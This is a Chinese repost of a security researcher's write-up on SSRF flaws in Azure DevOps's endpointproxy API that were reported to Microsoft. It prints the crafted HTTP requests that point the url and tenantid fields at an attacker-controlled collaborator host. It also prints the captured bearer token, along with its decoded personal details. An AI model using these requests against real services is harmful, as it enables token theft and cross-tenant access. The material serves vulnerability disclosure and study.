---
title: 赏金上万美刀的ssrf
url: https://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247497047&idx=1&sn=632249e2caedfb868d985fbddbd152a2&chksm=e8a5ff34dfd27622eeb79dfbc33362c6d3b113c540fe46a1b19e81bf7e879ff1edc11e2df9b7&scene=58&subscene=0#rd
source: 迪哥讲事
date: 2025-02-08
fetch_date: 2025-10-06T20:38:35.337388
---

# 赏金上万美刀的ssrf

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/YmmVSe19Qj6EsonQXh0p8jO1KudOPib0ibomAYXbjOSxfT8Md6E5ibfm7vY8SuzNQTozCUbP9DfjoCGBnW14QPicyA/0?wx_fmt=jpeg)

# 赏金上万美刀的ssrf

迪哥讲事

以下文章来源于骨哥说事
，作者骨哥说事

![](http://wx.qlogo.cn/mmhead/Tjnia6K0WAwzfic3VPt0EfMjicnGXzicDLoHEqtz1cP3Iozxf1tSyMxCFNG9Aya8SziaVKhVw7ia6QugE/0)

**骨哥说事**
.

一个喜爱鼓捣的技术宅

|  |
| --- |
| ****声明：****文章中涉及的程序(方法)可能带有攻击性，仅供安全研究与教学之用，读者将其信息做其他用途，由用户承担全部法律及连带责任，文章作者不承担任何法律及连带责任。 |

#

#

Binary Security（以下简称他们） 向微软报告了Azure DevOps中发现的三处SSRF漏洞。本文讲述了他们寻找这些漏洞的方式，并演示了使用DNS重新绑定和CRLF注入的利用技术。

# 背景

在参与测试期间，他们主要测试了Azure和DevOps环境中的漏洞和权限提升，他们想看看Azure是否有任意特权服务主体的服务连接可供项目中的所有管道使用。

这是一个常见漏洞，可能会产生严重后果，特别是在大型Azure DevOps项目中，拥有开发人员访问权限的攻击者可以滥用服务连接在Azure和其它连接系统中进行特权升级。

在二进制安全中，他们尝试自动化任何可以自动化的安全检查，他们打算在内部命令行界面中编写一个模块。

为了编写此模块，他们尝试查找所有将返回DevOps项目中的服务连接的Azure DevOps API端点。

但是，Azure DevOps的API文档毫无用处，因此只能通过Burp Suite代理了该应用程序（DevOps），并手动访问服务连接页面。很快便找到了一个有用的API端点，但是在创建服务连接时，但在创建服务连接时却被另一个更有趣的端点绕了过去：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/hZj512NN8jklKaJUh73JglsicG7mFToozCGwGVFnibz2BXP5mfQNDUQ4wxM6dnYFoGjsEiaOxVoarBGmZ1VIWXrlw/640?wx_fmt=png&from=appmsg "image.png")

发送的请求看起来像下面这样：

```
POST /binary-security/399814d8-d297-4bc1-9bc4-dad676bb7332/_apis/serviceendpoint/endpointproxy?endpointId=0 HTTP/2
Host: dev.azure.com
Cookie: <...>
Content-Length: 872

{
    "serviceEndpointDetails": {
        "authorization": {
            "parameters": {
                "accessTokenType": "AppToken",
                "serviceprincipalid": "",
                "serviceprincipalkey": "",
                "tenantid": "cb8bff8b-e82a-4629-aa12-9ad2ef2790be"
            },
            "scheme": "serviceprincipal"
        },
        "data": {
            "appObjectId": "",
            "azureSpnPermissions": "",
            "azureSpnRoleAssignmentId": "",
            "creationMode": "Automatic",
            "environment": "AzureCloud",
            "scopeLevel": "Subscription",
            "spnObjectId": "",
            "subscriptionId": "292c3ce5-4288-4413-8dad-5c665019739d",
            "subscriptionName": "Azure subscription 1"
        },
        "type": "azurerm",
        "url": "https://management.azure.com/"
    },
    "dataSourceDetails": {
        "dataSourceName": "AzureResourceGroups",
        "dataSourceUrl": "",
        "headers": [],
        "requestContent": "",
        "requestVerb": "",
        "resourceUrl": "",
        "parameters": {},
        "resultSelector": "",
        "initialContextTemplate": ""
    },
    "resultTransformationDetails": {
        "resultTemplate": "",
        "callbackContextTemplate": "",
        "callbackRequiredTemplate": ""
    }
}
```

# EndpointProxy SSRF

注意这个名为endpointpro的端点，它带有url参数，可以尝试插入Burp Partnerator的Payloads，以查看是否存在SSRF，还有下面这个：

```
POST /binary-security/399814d8-d297-4bc1-9bc4-dad676bb7332/_apis/serviceendpoint/endpointproxy?endpointId=0 HTTP/2
Host: dev.azure.com
Cookie: <COOKIES>
Content-Length: 911

{
    "serviceEndpointDetails": {
        "authorization": {
            "parameters": {
                "accessTokenType": "AppToken",
                "serviceprincipalid": "",
                "serviceprincipalkey": "",
                "tenantid": "cb8bff8b-e82a-4629-aa12-9ad2ef2790be"
            },
            "scheme": "serviceprincipal"
        },
        <...>
        "type": "azurerm",
        "url": "https://wcc0k51dmh8d8lgj3d0fzsrmrdxbl29r.bcollaborator.binsec.cloud/"
    },
    <...>
}

HTTP/2 200 OK
Cache-Control: no-cache
<...>
Date: Fri, 24 Nov 2023 19:01:32 GMT

{
    "result": [],
    "statusCode": 400,
    "errorMessage": "Unable to parse response as JSON object. Error: Unexpected character encountered while parsing value: <. Path '', line 0, position 0."
}
```

成功收到 Collaborator 服务器响应：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/hZj512NN8jklKaJUh73JglsicG7mFToozZM1LtccuficNXyJouMXyje3nqXynVMPwicDOqYBXymZBYZeJrJicKRiaYg/640?wx_fmt=png&from=appmsg "image.png")

该请求包含一个JWT Token，这很有趣。但是，在解码Token时，可以看到它是一个个人的Azure Token。

范围属于个人用户账户的Azure Resource Manager（ARM），这影响似乎不大。

Azure Token很奇怪，以前可以发放属于任意租户的`tid`声明的Token，如另一篇博客文章中所述（向下滚动至“无访客访问访问者”）。 Microsoft现在已经修复了这一点，但是他们在`endpointproxy`请求中尝试了相同的技巧，只需要将`tenantid`参数更改为其它租户：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/hZj512NN8jklKaJUh73JglsicG7mFToozK2m2VcicfLGSy2j21c3AFpxlZ4zHkzaicZ2HcNx62dy5LUGqUS1cGDIA/640?wx_fmt=png&from=appmsg "image.png")

Collaborator 服务器收到了以下请求：

```
POST /providers/Microsoft.ResourceGraph/resources?api-version=2021-03-01 HTTP/1.1
Accept: application/json
Request-Context: appId=cid-v1:0cc0e688-cf14-42b5-9911-f427a40700f1
Request-Id: |1983475f4bc4ff8e8bd40ebcbac3b27d.fc8b5558c1d1b5a5.
traceparent: 00-1983475f4bc4ff8e8bd40ebcbac3b27d-fc8b5558c1d1b5a5-00
User-Agent: vsts-serviceendpointproxy-service/v.19.247.35513.6 (EndpointId/0)
Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6InoxcnNZSEhKOS04bWdndDRIc1p1OEJLa0JQdyIsImtpZCI6InoxcnNZSEhKOS04bWdndDRIc1p1OEJLa0JQdyJ9.eyJhdWQiOiJodHRwczovL21hbmFnZW1lbnQuY29yZS53aW5kb3dzLm5ldC8iLCJpc3MiOiJodHRwczovL3N0cy53aW5kb3dzLm5ldC83MmY5ODhiZi04NmYxLTQxYWYtOTFhYi0yZDdjZDAxMWRiNDcvIiwiaWF0IjoxNzM2MjM0ODMzLCJuYmYiOjE3MzYyMzQ4MzMsImV4cCI6MTczNjIzOTQ1MywiYWNyIjoiMSIsImFpbyI6IkFXUUFtLzhaQUFBQXUyUkJaQXlQNnI4TlhTUmRwNzZiSXFhM0NuUklwSEJiTnVkNEhiZ055ZjBoeG14Y00yc0NTUzNBbFEvZU5aeC9FYTdZZmVSSDlmOUpsczBBOTdRNHdENHdQbU12NmZmQWlraUhoS0FrVlcxU0lpRXhQbWEyMkdlZ05UdHVIVFFmIiwiYWx0c2VjaWQiOiI1OjoxMDAzMjAwMTg3RDNGRDE3IiwiYW1yIjpbInB3ZCIsIm1mYSJdLCJhcHBpZCI6IjQ5OWI4NGFjLTEzMjEtNDI3Zi1hYTE3LTI2N2NhNjk3NTc5OCIsImFwcGlkYWNyIjoiMiIsImF1dGhfdGltZSI6MTczNjIzNDgyMywiZW1haWwiOiJ0b3JqdXNAYmluYXJ5c2VjdXJpdHkubm8iLCJmYW1pbHlfbmFtZSI6IlJldHRlcnN0w7hsIiwiZ2l2ZW5fbmFtZSI6IlRvcmp1cyBCcnluZSIsImlkcCI6Imh0dHBzOi8vc3RzLndpbmRvd3MubmV0L2NiOGJmZjhiLWU4MmEtNDYyOS1hYTEyLTlhZDJlZjI3OTBiZS8iLCJpZHR5cCI6InVzZXIiLCJpcGFkZHIiOiIxOTUuMC4xNDMuMTk4IiwibmFtZSI6IlRvcmp1cyIsInJoIjoiMS5BUm9BdjRqNWN2R0dyMEdScXkxODBCSGJSMFpJZjNrQXV0ZFB1a1Bhd2ZqMk1CTWFBSllhQUEuIiwic2NwIjoidXNlcl9pbXBlcnNvbmF0aW9uIiwic2lkIjoiMmVkYjBkOGQtYmE0OC00YjQ3LWE5N2ItMzk5NWJmMzA5OTllIiwic3ViIjoiQXVTWDJNVGN2dE9hYXFobE4yd0o4QjQxclJfcGRrajNZbEtPVHYzZU9xRSIsInRpZCI6IjcyZjk4OGJmLTg2ZjEtNDFhZi05MWFiLTJkN2NkMDExZGI0NyIsInVuaXF1ZV9uYW1lIjoidG9yanVzQGJpbmFyeXNlY3VyaXR5Lm5vIiwidXRpIjoiZWdxNGl1V3BpRU9HVHNmcWtaOGFBUSIsInZlciI6IjEuMCIsInhtc19lZG92Ijp0cnVlLCJ4bXNfaWRyZWwiOiIyMiAxNSIsInhtc190Y2R0IjoxMjg5MjQxNTQ3fQ.cH9SHBrZq_XvcEV4pGriWz9LAYbSv_FKpJo0EDhef6ksaK5h43kmj__Uedmi4gdrcVCBnRar0IYX-dUQ2Cysj9IYvoqXA9R_BBe4xJumhcjLxxHK1uV5l3MYGVAmN3u_st-mZWAEs3mRxLaGAJX1UIItXW2mNyEBsBvHqNtReJq3azngbQ74KovG3b-iT0_oGnuhJ8Y5B1qNswoRNzT6tPPOyC_RDd932qUGgzpM-3AYwQsia3WdR-PZss2T52SXJl02CqNQxY0xxKl0g0e9_Tvd4rfkKVHrcCvTgTw24mO8X9D7xSadDw9HGnc_cnBE6Jmf5S0WPUQAzLHkqPoZHA
Content-Type: application/json; charset=utf-8
Host: dl2htmauvyhuh2p0cu9w89030u6summab.bcollaborator.binsec.cloud
Content-Length: 168
Expect: 100-continue
Connection: Keep-Alive

{"query":"resourcecontainers|where subscriptionId=='292c3ce5-4288-4413-8dad-5c665019739d'|where type=='microsoft.resources/subscriptions/resourcegroups'|distinct name"}
```

在请求中解码JWT时，可以会获取到以下信息：

```
{
    "aud": "https://management.core.windows.net/",
    "iss": "https://sts.windows.net/72f988bf-86f1-41af-91ab-2d7cd011db47/",
    "iat": 1736234833,
    "nbf": 1736234833,
    "exp": 1736239453,
    "acr": "1",
    "aio": "AWQAm/8ZAAAAu2RBZAyP6r8NXSRdp76bIqa3CnRIpHBbNud4HbgNyf0hxmxcM2sCSS3AlQ/eNZx/Ea7YfeRH9f9Jls0A97Q4wD4wPmMv6ffAikiHhKAkVW1SIiExPma22GegNTtuHTQf",
    "altsecid": "5::1003200187D3FD17",
    "amr": [
        "pwd",
        "mfa"
    ],
    "appid": "499b84ac-1321-427f-aa17-267ca6975798",
    "appidacr": "2",
    "auth_time": 1736234823,
    "email": "torjus@binarysecurity.no",
    "family_name": "Retterstøl",
    "given_name": "Torjus Bryne",
    "idp": "https://sts.windows.net/cb8bff8b-e82a-4629-aa12-9ad2ef2790be/",
    "idtyp": "user",
    "ipaddr": "195.0.143.198",
    "name": "Torjus",
    "rh": "1.ARoAv4j5cvGGr0GRqy180BHbR0ZIf3kAutdPukPawfj2MBMaAJYaAA.",
    "scp": "user_impersonation",
    "sid": "2edb0d8d-ba48-4b47-a97b...